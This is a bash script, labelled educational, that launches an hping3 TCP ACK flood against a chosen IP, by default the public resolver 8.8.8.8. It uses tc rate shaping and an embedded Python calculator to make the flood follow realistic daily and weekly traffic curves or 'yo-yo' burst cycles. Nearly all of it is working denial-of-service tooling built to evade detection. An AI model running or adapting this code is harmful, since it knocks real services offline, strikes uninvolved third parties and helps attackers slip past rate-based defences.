#!/bin/bash

# =================================================================
#             ACK FLOOD WITH HTB SUPPORT (EDUCATIONAL)
# =================================================================

# Default parameters
TARGET_IP="${1:-8.8.8.8}"
INTERFACE="${2:-eth0}"
DURATION="${3:-300}"
TIME_COMPRESSION="${4:-288}"                        
LOG_FILE="hping3_ack_flood_$(date +%Y%m%d_%H%M%S).log"
VERBOSE=true

# TC QDISC config
PACKET_SIZE=60
BURST_SIZE="500b"
LATENCY="5ms"
MIN_RATE="1kbit"
MAX_RATE="1gbit"

# PID and flags
HPING_PID=""
TC_ACTIVE=false
PYTHON_AVAILABLE=false

# HTB Mode variables (set by launcher)
HTB_MODE="${HTB_MODE:-false}"
HTB_INTERFACE="${HTB_INTERFACE:-}"
HTB_CLASS_ID="${HTB_CLASS_ID:-}"
HTB_TOTAL_BANDWIDTH="${HTB_TOTAL_BANDWIDTH:-10mbit}"

# Dependencies check
check_dependencies() {
    local missing_deps=()
    
    if ! command -v hping3 &> /dev/null; then
        missing_deps+=("hping3")
    fi
    
    if ! command -v bc &> /dev/null; then
        missing_deps+=("bc")
    fi
    
    if ! command -v tc &> /dev/null; then
        missing_deps+=("iproute2")
    fi
    
    if [[ $EUID -ne 0 ]]; then
        log "ERROR: Root privileges required"
        exit 1
    fi
    
    if [ ${#missing_deps[@]} -gt 0 ]; then
        log "ERROR: Missing dependencies: ${missing_deps[*]}"
        exit 1
    fi
    
    if ! ip link show "$INTERFACE" &>/dev/null; then
        log "ERROR: Interface $INTERFACE does not exist"
        exit 1
    fi
}

# Check Python availability
check_python() {
    if command -v python3 &> /dev/null; then
        if python3 -c "import math; print('Python math OK')" &>/dev/null; then
            PYTHON_AVAILABLE=true
            log "Python3 with math module: Available"
            return 0
        fi
    fi
    
    if command -v python &> /dev/null; then
        if python -c "import math; print('Python math OK')" &>/dev/null; then
            PYTHON_AVAILABLE=true
            log "Python with math module: Available"
            return 0
        fi
    fi
    
    log "WARNING: Python not available, falling back to simplified math"
    PYTHON_AVAILABLE=false
    return 1
}

# Logging Function
log() {
    local message="$1"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] $message" | tee -a "$LOG_FILE"
}

# Cleanup Function
cleanup() {
    log "=== CLEANUP STARTED ==="
    
    if [ -n "$HPING_PID" ] && kill -0 "$HPING_PID" 2>/dev/null; then
        log "Killing hping3 process (PID: $HPING_PID)"
        kill -TERM "$HPING_PID"
        sleep 2
        if kill -0 "$HPING_PID" 2>/dev/null; then
            kill -KILL "$HPING_PID"
        fi
        wait "$HPING_PID" 2>/dev/null
    fi
    
    # Only remove qdisc if NOT in HTB mode (launcher will handle it)
    if [ "$HTB_MODE" != "true" ] && [ "$TC_ACTIVE" = true ]; then
        log "Removing tc qdisc from interface $INTERFACE"
        tc qdisc del dev "$INTERFACE" root 2>/dev/null || true
        TC_ACTIVE=false
    fi
    
    log "=== CLEANUP COMPLETED ==="
    exit 0
}

trap cleanup EXIT INT TERM

# Python script for calculating traffic patterns
create_python_calculator() {
    cat << 'PYTHON_SCRIPT' > /tmp/traffic_calculator.py
#!/usr/bin/env python3
import math
import sys

def calculate_hourly_rate(hour, scale_factor=1):
    morning_peak = 36 * math.exp(-((hour - 9) ** 2) / 6.8)
    evening_peak = 55 * math.exp(-((hour - 20) ** 2) / 7.84)
    night_drop = -15 * math.exp(-((hour - 2.5) ** 2) / 3.24)
    daily_cycle = 5 * math.sin(math.pi * hour / 12 - math.pi/2)
    base_level = 20
    traffic_factor = base_level + morning_peak + evening_peak + night_drop + daily_cycle
    pps = max(1, traffic_factor * scale_factor)
    return int(pps)

def calculate_weekly_multiplier(day_of_week):
    base = 87
    sine_component = 8 * math.sin(2 * math.pi * day_of_week / 7 + math.pi/7)
    weekend_spike = 5 * math.exp(-((day_of_week - 6) ** 2) / 2.25)
    weekly_factor = (base + sine_component + weekend_spike) / base
    return weekly_factor

def calculate_minute_factor(minute_in_hour):
    return 1 + 0.3 * math.sin(2 * math.pi * minute_in_hour / 60)

def get_compressed_time(elapsed_seconds, compression_factor):
    virtual_hours = elapsed_seconds * compression_factor / 3600
    current_hour = int(virtual_hours % 24)
    virtual_days = virtual_hours / 24
    day_of_week = int(virtual_days % 7) + 1
    seconds_in_hour = (elapsed_seconds * compression_factor) % 3600
    minute_in_hour = int(seconds_in_hour / 60)
    return current_hour, day_of_week, minute_in_hour

def calculate_traffic_rate(elapsed_seconds, compression_factor, noise_factor=0.1):
    hour, day, minute = get_compressed_time(elapsed_seconds, compression_factor)
    hourly_rate = calculate_hourly_rate(hour)
    weekly_multiplier = calculate_weekly_multiplier(day)
    minute_factor = calculate_minute_factor(minute)
    base_rate = hourly_rate * weekly_multiplier * minute_factor
    import random
    noise = random.uniform(-noise_factor, noise_factor)
    final_rate = base_rate * (1 + noise)
    return max(1, int(final_rate)), hour, day, minute

def calculate_yoyo_rate(elapsed_seconds, cycle_duration=1800, yoyo_type="square"):
    cycle_position = (elapsed_seconds % cycle_duration) / cycle_duration
    if yoyo_type == "square":
        return 10000 if cycle_position < 0.5 else 100
    elif yoyo_type == "sawtooth":
        if cycle_position < 0.7:
            return int(1000 + 10000 * cycle_position / 0.7)
        else:
            return 1000
    elif yoyo_type == "burst":
        if cycle_position < 0.2:
            return 12000
        elif cycle_position < 0.4:
            return 8000
        else:
            return 800
    else:
        return 5000

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 traffic_calculator.py <mode> <elapsed_seconds> [compression_factor] [yoyo_type]")
        sys.exit(1)
    
    mode = sys.argv[1]
    elapsed_seconds = float(sys.argv[2])
    
    if mode == "compressed":
        compression_factor = float(sys.argv[3]) if len(sys.argv) > 3 else 72
        rate, hour, day, minute = calculate_traffic_rate(elapsed_seconds, compression_factor)
        print(f"{rate} {hour} {day} {minute}")
    
    elif mode == "yoyo":
        yoyo_type = sys.argv[3] if len(sys.argv) > 3 else "square"
        rate = calculate_yoyo_rate(elapsed_seconds, yoyo_type=yoyo_type)
        cycle_pos = (elapsed_seconds % 20) / 20
        print(f"{rate} {cycle_pos:.2f}")
    
    else:
        print("Unknown mode")
        sys.exit(1)
PYTHON_SCRIPT
    
    chmod +x /tmp/traffic_calculator.py
}

# Fallback math functions
calculate_simple_rate() {
    local hour=$1
    local day=$2
    local minute=$3
    local base_rate=5000
    
    if [ $hour -ge 8 ] && [ $hour -le 10 ]; then
        base_rate=8000
    elif [ $hour -ge 19 ] && [ $hour -le 21 ]; then
        base_rate=12000
    elif [ $hour -ge 1 ] && [ $hour -le 5 ]; then
        base_rate=2000
    fi
    
    if [ $day -eq 6 ] || [ $day -eq 7 ]; then
        base_rate=$(echo "scale=0; $base_rate * 1.3 / 1" | bc -l)
    fi
    
    local minute_var=$(echo "scale=0; $minute % 10" | bc -l)
    local variation=$(echo "scale=0; $base_rate * $minute_var / 100" | bc -l)
    local final_rate=$(echo "scale=0; $base_rate + $variation" | bc -l)
    echo "$final_rate"
}

# Convert PPS to bandwidth
pps_to_bandwidth() {
    local pps=$1
    local bps=$(echo "scale=0; $pps * $PACKET_SIZE * 8" | bc -l)
    
    local min_bps=1000
    if [ $(echo "$bps < $min_bps" | bc -l) -eq 1 ]; then
        bps=$min_bps
    fi
    
    if [ $(echo "$bps >= 1000000000" | bc -l) -eq 1 ]; then
        local gbps=$(echo "scale=2; $bps / 1000000000" | bc -l)
        echo "${gbps}gbit"
    elif [ $(echo "$bps >= 1000000" | bc -l) -eq 1 ]; then
        local mbps=$(echo "scale=2; $bps / 1000000" | bc -l)
        echo "${mbps}mbit"
    elif [ $(echo "$bps >= 1000" | bc -l) -eq 1 ]; then
        local kbps=$(echo "scale=0; $bps / 1000" | bc -l)
        echo "${kbps}kbit"
    else
        echo "1kbit"
    fi
}

# TC qdisc init functions - MODIFIED FOR HTB
init_tc_qdisc() {
    # Skip if HTB mode (launcher handles qdisc)
    if [ "$HTB_MODE" = "true" ]; then
        log "HTB Mode: Skipping qdisc initialization (handled by launcher)"
        log "HTB Class ID: $HTB_CLASS_ID"
        TC_ACTIVE=true
        return 0
    fi
    
    # Standalone mode: Use TBF as before
    log "Standalone Mode: Initializing TBF qdisc on interface $INTERFACE"
    tc qdisc del dev "$INTERFACE" root 2>/dev/null || true
    
    if tc qdisc add dev "$INTERFACE" root tbf rate "$MIN_RATE" burst "$BURST_SIZE" latency "$LATENCY"; then
        TC_ACTIVE=true
        log "TC qdisc initialized successfully"
        return 0
    else
        log "ERROR: Failed to initialize TC qdisc"
        return 1
    fi
}

# Update tc rate - MODIFIED FOR HTB
update_tc_rate() {
    local new_rate="$1"
    
    if [ "$TC_ACTIVE" != true ]; then
        return 1
    fi
    
    # HTB mode: Update class instead of qdisc
    if [ "$HTB_MODE" = "true" ]; then
        if [ -z "$HTB_CLASS_ID" ]; then
            log "ERROR: HTB_CLASS_ID not set"
            return 1
        fi
        
        # Extract parent from class ID (e.g., "1:10" → "1:1")
        local parent_class="1:1"
        
        if tc class change dev "$HTB_INTERFACE" parent "$parent_class" classid "$HTB_CLASS_ID" htb \
            rate "$new_rate" ceil "$HTB_TOTAL_BANDWIDTH" prio 1 2>/dev/null; then
            return 0
        else
            log "WARNING: Failed to update HTB class $HTB_CLASS_ID to $new_rate"
            return 1
        fi
    else
        # Standalone mode: Update TBF qdisc
        if tc qdisc change dev "$INTERFACE" root tbf rate "$new_rate" burst "$BURST_SIZE" latency "$LATENCY" 2>/dev/null; then
            return 0
        else
            log "WARNING: Failed to update TC rate to $new_rate, reinitializing..."
            tc qdisc del dev "$INTERFACE" root 2>/dev/null || true
            if tc qdisc add dev "$INTERFACE" root tbf rate "$new_rate" burst "$BURST_SIZE" latency "$LATENCY"; then
                return 0
            else
                log "ERROR: Failed to reinitialize TC qdisc"
                TC_ACTIVE=false
                return 1
            fi
        fi
    fi
}

# Init hping3 in background
start_hping3_flood() {
    log "Starting hping3 ACK flood to $TARGET_IP"
    
    hping3 \
        -A \
        --flood \
        -p 80 \
        --interface "$INTERFACE" \
        "$TARGET_IP" \
        >> "$LOG_FILE" 2>&1 &
    
    HPING_PID=$!
    
    if [ -n "$HPING_PID" ] && kill -0 "$HPING_PID" 2>/dev/null; then
        log "hping3 started successfully (PID: $HPING_PID)"
        return 0
    else
        log "ERROR: Failed to start hping3"
        return 1
    fi
}

# Main pattern generation with Python support
generate_compressed_pattern_python() {
    local duration_seconds=$1
    
    local mode_label="STANDALONE"
    if [ "$HTB_MODE" = "true" ]; then
        mode_label="HTB (Class: $HTB_CLASS_ID)"
    fi
    
    log "=== PYTHON-ENHANCED TC SIMULATION (ACK) ==="
    log "Mode: $mode_label"
    log "Math Engine: Python3 with accurate mathematical functions"
    log "Compression factor: ${TIME_COMPRESSION}x"
    
    if ! init_tc_qdisc; then
        log "ERROR: Cannot initialize TC qdisc"
        return 1
    fi
    
    if ! start_hping3_flood; then
        log "ERROR: Cannot start hping3 flood"
        return 1
    fi
    
    local update_interval=60
    local current_time=0
    local last_rate=""
    
    while [ $current_time -lt $duration_seconds ]; do
        local python_output
        if python_output=$(python3 /tmp/traffic_calculator.py compressed $current_time $TIME_COMPRESSION 2>/dev/null); then
            local final_pps=$(echo "$python_output" | awk '{print $1}')
            local virtual_hour=$(echo "$python_output" | awk '{print $2}')
            local virtual_day=$(echo "$python_output" | awk '{print $3}')
            local virtual_minute=$(echo "$python_output" | awk '{print $4}')
            
            local bandwidth=$(pps_to_bandwidth "$final_pps")
            
            if [ "$bandwidth" != "$last_rate" ]; then
                if update_tc_rate "$bandwidth"; then
                    log "T+${current_time}s | Virtual: Day${virtual_day} ${virtual_hour}:$(printf "%02d" $virtual_minute) | PPS: ${final_pps} | BW: ${bandwidth} [PYTHON]"
                    last_rate="$bandwidth"
                else
                    log "T+${current_time}s | ERROR: Failed to update TC rate to $bandwidth"
                fi
            elif [ "$VERBOSE" = true ]; then
                log "T+${current_time}s | Virtual: Day${virtual_day} ${virtual_hour}:$(printf "%02d" $virtual_minute) | PPS: ${final_pps} | BW: ${bandwidth} [unchanged]"
            fi
        else
            log "T+${current_time}s | ERROR: Python calculation failed, using fallback"
            local hour=$(echo "scale=0; ($current_time * $TIME_COMPRESSION / 3600) % 24" | bc -l)
            local day=$(echo "scale=0; ($current_time * $TIME_COMPRESSION / 86400) % 7 + 1" | bc -l)
            local minute=$(echo "scale=0; ($current_time * $TIME_COMPRESSION % 3600) / 60" | bc -l)
            
            local simple_rate=$(calculate_simple_rate $hour $day $minute)
            local bandwidth=$(pps_to_bandwidth "$simple_rate")
            
            update_tc_rate "$bandwidth"
            log "T+${current_time}s | Virtual: Day${day} ${hour}:$(printf "%02d" $minute) | PPS: ${simple_rate} | BW: ${bandwidth} [FALLBACK]"
        fi
        
        sleep $update_interval
        current_time=$((current_time + update_interval))
    done
}

# Yo-yo pattern with Python
generate_yoyo_pattern_python() {
    local duration_seconds=$1
    local yoyo_type="${2:-square}"
    
    local mode_label="STANDALONE"
    if [ "$HTB_MODE" = "true" ]; then
        mode_label="HTB (Class: $HTB_CLASS_ID)"
    fi
    
    log "=== PYTHON-ENHANCED YO-YO PATTERN (ACK) ==="
    log "Mode: $mode_label"
    log "Type: $yoyo_type | Duration: ${duration_seconds}s"
    
    if ! init_tc_qdisc; then
        log "ERROR: Cannot initialize TC qdisc"
        return 1
    fi
    
    if ! start_hping3_flood; then
        log "ERROR: Cannot start hping3 flood"
        return 1
    fi
    
    local update_interval=60
    local current_time=0
    
    while [ $current_time -lt $duration_seconds ]; do
        local python_output
        if python_output=$(python3 /tmp/traffic_calculator.py yoyo $current_time $yoyo_type 2>/dev/null); then
            local pps=$(echo "$python_output" | awk '{print $1}')
            local cycle_pos=$(echo "$python_output" | awk '{print $2}')
            
            local bandwidth=$(pps_to_bandwidth "$pps")
            
            if update_tc_rate "$bandwidth"; then
                log "T+${current_time}s | Cycle: ${cycle_pos} | PPS: ${pps} | BW: ${bandwidth} [$yoyo_type-PYTHON]"
            else
                log "T+${current_time}s | ERROR: Failed to update yo-yo rate to $bandwidth"
            fi
        else
            log "T+${current_time}s | ERROR: Python yo-yo calculation failed"
        fi
        
        sleep $update_interval
        current_time=$((current_time + update_interval))
    done
}

# Main function
main() {
    local mode="${5:-python-compressed}"
    local yoyo_type="${6:-square}"
    
    log "=== PYTHON-ENHANCED HPING3 ACK TRAFFIC SIMULATOR ==="
    log "Target: $TARGET_IP"
    log "Interface: $INTERFACE"
    log "Duration: ${DURATION}s"
    log "Compression: ${TIME_COMPRESSION}x"
    log "Mode: $mode"
    
    if [ "$HTB_MODE" = "true" ]; then
        log "HTB Mode: ENABLED"
        log "HTB Interface: $HTB_INTERFACE"
        log "HTB Class ID: $HTB_CLASS_ID"
        log "HTB Total BW: $HTB_TOTAL_BANDWIDTH"
    else
        log "HTB Mode: DISABLED (Standalone)"
    fi
    
    check_dependencies
    check_python
    
    if [ "$PYTHON_AVAILABLE" = true ]; then
        create_python_calculator
        log "Python math calculator created successfully"
    else
        log "Using simplified math fallback"
    fi
    
    if ! ping -c 1 -W 2 "$TARGET_IP" &>/dev/null; then
        log "WARNING: Target $TARGET_IP may not be reachable"
    fi
    
    case "$mode" in
        "python-compressed")
            if [ "$PYTHON_AVAILABLE" = true ]; then
                generate_compressed_pattern_python "$DURATION"
            else
                log "Python not available, falling back to simplified mode"
            fi
            ;;
        "python-yoyo")
            if [ "$PYTHON_AVAILABLE" = true ]; then
                generate_yoyo_pattern_python "$DURATION" "$yoyo_type"
            else
                log "Python not available, cannot run python-yoyo mode"
                exit 1
            fi
            ;;
        *)
            log "ERROR: Unknown mode: $mode"
            exit 1
            ;;
    esac
    
    rm -f /tmp/traffic_calculator.py
    
    log "=== SIMULATION COMPLETED ==="
    log "Log file: $LOG_FILE"
}

if [[ "$1" == "-h" || "$1" == "--help" ]]; then
    echo "ACK Flood Script with HTB Support"
    echo "Can run standalone or be launched by HTB launcher"
    echo "Usage: $0 [TARGET_IP] [INTERFACE] [DURATION] [COMPRESSION] [MODE] [YOYO_TYPE]"
    exit 0
fi

main "$@"
